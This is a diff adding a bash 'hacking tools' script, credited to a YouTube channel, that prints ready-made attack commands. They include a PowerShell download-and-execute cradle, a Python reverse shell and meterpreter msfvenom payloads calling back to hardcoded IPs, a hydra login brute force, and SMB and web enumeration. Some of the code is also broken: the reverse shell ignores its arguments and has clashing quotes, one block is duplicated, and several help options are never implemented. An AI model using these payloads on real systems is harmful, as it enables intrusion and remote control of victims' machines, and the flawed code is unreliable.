@@ -1,0 +1,158 @@
+#!/usr/bin/bash
+#created by massco99
+#all thanks to GOD
+#massco99 hacker @YouTube
+#https://www.youtube.com/@massco99hacker/videos
+#videoonlinecosmas99.atwebpages.com
+##
+echo welcome to massco99 hacking tools
+##
+SWITCH=$1
+#Intent: To produce a payload in an effort to receive a PowerShell reverse shell. Payload usese Invoke-Expression to download a file from a remote server. 
+if [ "$SWITCH" == "--iex" ];
+then
+        PORT=$2
+        FILE=$3
+        echo ""
+        echo "iex(new-object net.webclient).downloadstring('http://10.9.14.175:$PORT/$FILE')"
+fi
+
+if [ "$SWITCH" == "--help" ]
+then
+    echo ""
+        echo "HELP FOR SCRIPT USAGE:"
+        echo "skipper --smb [IP]"
+        echo ""
+        echo "Web:"
+        echo "skipper --hosts [IP] [DOMAIN]"
+        echo "skipper --curlhead [IP] [PORT]"
+        echo "skipper --curlget [IP] [PORT]"
+        echo "skipper --hydrahttp [USER] [SUBDOMAINORIP] [URI] [USERPARAM] [PASSPARAM] [FAILURESTRING]"
+        echo "skipper --ffufpost [PARAM] [IP] [PORT] [URI]"
+        echo "skipper --gobuster [IP]"
+        echo ""
+        echo "Nmap:"
+        echo "skipper --nmap [IP] [name]"
+        echo ""
+        echo "Misc:"
+        echo "skipper --mount [DRIVE] [LOCATION]" 
+        echo "skipper --pythonshell [IP] [PORT]"
+        echo "skipper --improveshell"
+        echo "skipper --bashbase64 [PORT]"
+        echo "skipper --replace [UNWANTED] [WANTED] [FILE]"
+        echo "skipper --msfvenom [PORT] [EXT]"
+fi
+
+if [ "$SWITCH" == "--hosts" ]
+then
+        IP=$2
+        DOMAIN=$3
+        echo "echo '$2 $3' | sudo tee -a /etc/hosts"
+fi
+
+
+if [ "$SWITCH" == "--nmap" ]
+then
+        IP=$2
+        NAME=$3
+        echo "ports=\$(sudo nmap -p- -sS $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//); echo \$ports; nmap -sC -sV -p\$ports $IP -oN $NAME.scriptscan"
+fi
+
+if [ "$SWITCH" == "--pythonshell" ]
+then
+        IP=$2
+        PORT=$3
+        echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.6.196",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"
+fi
+
+if [ "$SWITCH" == "--improveshell" ]
+then
+        echo "# In reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+# In Kali
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>"
+fi
+
+if [ "$1" == "--smb" ]
+then
+        IP=$2
+        echo "enum4linux $IP"
+        echo "smbclient -L $IP"
+        echo "smbclient \\\\$IP\\DIRECTORY"
+        echo "mget *"
+        echo "exiftool [FILE]"
+        echo "strings [FILE]"
+        echo "put [FILE]"
+fi
+
+if [ "$1" == "--msfvenom" ]
+then
+        PORT=$2
+        EXT=$3
+        echo "Description: A staged meterpreter executable runs which beacons out to our C2 server to receive a second stage which is then injected and executed in memory, which triggers a reverse shell callback."
+        echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.6.196 LPORT=$PORT -f $EXT > shell.$EXT"
+        echo "msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.8.6.196 LPORT=$PORT -f $EXT > shell.$EXT"
+        echo "msfvenom -p windows/meterpreter/reverse_http LHOST=10.8.6.196 LPORT=$PORT -f $EXT"
+fi
+
+
+if [ "$1" == "--hydrahttp" ]
+then
+        USER=$2
+        IP=$3
+        URI=$4
+        USERPARAM=$5
+        PASSPARAM=$6
+        FAILURESTRING=$7
+
+        echo "sudo hydra -l $USER -P /usr/share/wordlists/rockyou.txt $IP http-post-form \"/$URI:$USERPARAM=^USER^&$PASSPARAM=^PASS^:$FAILURESTRING\""
+
+fi
+
+if [ "$1" == "--dirhttp" ]
+then
+        IP=$2
+        PORT=$3
+        echo "gobuster dir -u http://$IP:$PORT -w /usr/share/seclists/Discovery/Web-Content/common.txt -r"
+fi
+
+if [ "$1" == "--curlhead" ]
+then
+        IP=$2
+        PORT=$3
+        URI=$4
+        echo "curl --HEAD http://$IP:$PORT/$URI"
+fi
+
+if [ "$1" == "--gobuster" ]
+then
+        IP=$2
+        PORT=$3
+        echo "gobuster dir -u http://$IP:$PORT -w /usr/share/seclists/Discovery/Web-Content/common.txt -r"
+fi
+
+if [ "$1" == "--curlhead" ]
+then
+        IP=$2
+        PORT=$3
+        URI=$4
+        echo "curl --HEAD http://$IP:$PORT/$URI"
+fi
+
+
+if [ "$1" == "--curlget" ]
+then
+        IP=$2
+        PORT=$3
+        URI=$4
+        echo "curl --GET http://$IP:$PORT/$URI"
+fi
